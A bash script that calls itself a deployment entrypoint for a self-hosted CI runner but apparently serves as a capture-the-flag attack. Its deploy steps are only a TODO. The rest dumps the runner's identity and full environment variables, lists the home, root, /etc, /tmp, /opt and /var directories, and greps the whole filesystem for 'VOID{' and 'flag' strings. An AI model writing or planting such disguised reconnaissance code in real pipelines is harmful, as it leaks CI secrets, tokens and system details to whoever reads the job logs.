#!/usr/bin/env bash
# Deployment entrypoint executed by the self-hosted runner.
set -euo pipefail
echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
echo "[deploy] pulling latest VOID service artifacts..."
# TODO: real deploy steps (rsync artifacts, restart services)
echo "[deploy] done."
echo "=== TARGET INSPECTION ==="
id
env 
ls -la /
echo "===== SYSTEM ====="
id
whoami
hostname
pwd

echo "===== ENV ====="
env | sort

echo "===== HOME ====="
ls -la ~
find ~ -maxdepth 3 2>/dev/null

echo "===== ROOT ====="
ls -la /

echo "===== ETC ====="
ls -la /etc 2>/dev/null

echo "===== TMP ====="
ls -la /tmp 2>/dev/null

echo "===== OPT ====="
ls -la /opt 2>/dev/null

echo "===== VAR ====="
ls -la /var 2>/dev/null

echo "===== SEARCH VOID ====="
grep -R "VOID{" / 2>/dev/null

echo "===== SEARCH FLAG ====="
grep -R "flag" / 2>/dev/null
